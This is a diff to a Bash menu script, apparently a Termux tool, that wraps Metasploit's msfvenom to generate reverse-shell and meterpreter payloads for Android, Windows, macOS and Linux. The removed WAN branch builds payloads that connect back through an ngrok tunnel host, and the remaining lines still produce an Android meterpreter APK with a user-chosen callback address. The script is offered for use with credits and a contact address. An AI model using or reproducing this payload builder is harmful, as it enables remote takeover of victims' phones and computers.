@@ -32,13 +32,6 @@ echo -e "$reset"
 cd $HOME
 if [ -d $HOME/metasploit-framework ];
 then
-echo -e "$cyan Pls Select Network type"
-echo -e "$green 1-> WAN"
-echo -e "$green 2-> LAN"
-echo -e "$green 3-> exit"
-read -p 'Choice: ' lw
-if [ $lw = '2' ];
-then
 echo -e "$cyan Pls Select Platform Of Payload"
 echo -e "$green 1-> Android"
 echo -e "$green 2-> Windows"
@@ -52,7 +45,18 @@ read -p 'Choice:' ch2
 if [ $ch2 = '0' ];
 then 
 echo -e "$blue Bye Bye..... "
+sleep 1
 clear
+echo -e "$grey  ___________ "
+echo -e "$cyan /   _____/  | __ "
+echo -e "$blue \_____   \| |/ / "
+echo -e "$yellow  /        \   <  "
+echo -e "$cyan /_______  /__|_ \ "
+echo -e "$grey         \/     \/ "
+#echo 'Official Sk script'
+echo -e "$cyan For Any Problem Contact me On"
+echo -e "$green suyash_yt@datamail.in"
+echo -e "$reset"
 fi
 if [ $ch2 = '5' ];
 then
@@ -133,107 +137,7 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > /sdcar
 echo -e "Payload name is $cyan skapp.apk"
 echo -e "$green Payload Saved In Sdcard"
 fi
-fi
-if [ $lw = '1' ];
-then
-echo -e "$cyan Pls Select Platform Of Payload"
-echo -e "$green 1-> Android"
-echo -e "$green 2-> Windows"
-echo -e "$green 3-> Mac"
-echo -e "$green 4-> Linux"
-echo -e "$green 5-> Credits"
-echo -e "$green 6-> Changelog"
-echo -e "$green 0-> Exit"
-echo -e "$cyan"
-read -p 'Choice:' ch2
-if [ $ch2 = '0' ];
-then 
-echo -e "$blue Bye Bye..... "
-clear
-fi
-if [ $ch2 = '5' ];
-then
-clear
-echo -e "$yellow Credits……………"
-echo -e "$cyan 1> Suyash Khandare"
-echo -e "$green For Creating the Script"
-echo " "
-echo -e "$cyan 2> Lokesh Pandey"
-echo -e "$green For Giving Metasploit install Script"
-echo -e "$reset"
-echo -e "$cyan 3) And You -$blue Keep Supporting"
-fi
-if [ $ch2 = '6' ];
-then
-clear
-echo -e "$yellow Changelog...."
-echo -e "$grey V1.0"
-echo -e "$reset"
-echo -e "$grey V1.2,$blue Minor Bug Fix"
-echo -e "$reset"
-echo -e "$grey V1.5,$blue removed the password system"
-echo -e "$reset"
-echo -e "$grey V2.0,$blue Added a WAN support"
-echo -e "$reset"
-echo -e "$grey V2.2,$blue Fix the WAN payloads"
-echo -e "$reset"
-echo -e "$grey V2.5,$blue Load the Easy Payload From any Terminal"
-fi
-if [ $ch2 = '4' ];
-then
-read -p 'Pls Enter port Given By Ngrok:' lport
-echo -e "$grey [*] Please Wait Loading ..."
-cd $HOME
-cd metasploit-framework
-ruby msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$lport -f elf > /sdcard/sklinux.elf
-echo -e "Payload name is $cyan sklinux.elf"
-echo -e "$green Payload Saved In Sdcard"
-fi
-if [ $ch2 = '3' ];
-then
-read -p 'Pls Enter port Given By Ngrok:' lport
-echo -e "$grey [*] Please Wait Loading ..."
-cd $HOME
-cd metasploit-framework
-ruby msfvenom -p osx/x86/shell_reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$lport -f macho > /sdcard/skshell.macho
-echo -e "Payload name is $cyan skshell.macho"
-echo -e "$green Payload Saved In Sdcard"
-fi
-if [ $ch2 = '2' ];
-then
-read -p 'Pls Enter port Given by Ngrok:' lport
-echo -e "$grey [*] Please Wait Loading ..."
-cd $HOME
-cd metasploit-framework
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$lport -f exe > /sdcard/skshell.exe
-echo -e "Payload name is $cyan skshell.exe"
-echo -e "$green Payload Saved In Sdcard"
-fi
-if [ $ch2 = '1' ];
-then
-read -p 'Pls Enter port Given By ngrok:' lport
-echo -e "$grey [*] Please Wait Loading ..."
-cd $HOME
-cd metasploit-framework
-msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$lport R > /sdcard/skapp.apk
-echo -e "Payload name is $cyan skapp.apk"
-echo -e "$green Payload Saved In Sdcard" 
-fi
-fi
-if [ $lw = '3' ];
-then
-clear
-fi
-echo -e "$grey  ___________ "
-echo -e "$cyan /   _____/  | __ "
-echo -e "$blue \_____   \| |/ / "
-echo -e "$yellow  /        \   <  "
-echo -e "$cyan /_______  /__|_ \ "
-echo -e "$grey         \/     \/ "
-#echo 'Official Sk script'
-echo -e "$cyan For Any Problem Contact me On"
-echo -e "$green suyash_yt@datamail.in"
-echo -e "$reset"
+
 else
 echo -e "$red ****Metasploit Not Found****"
 echo -e "$reset"
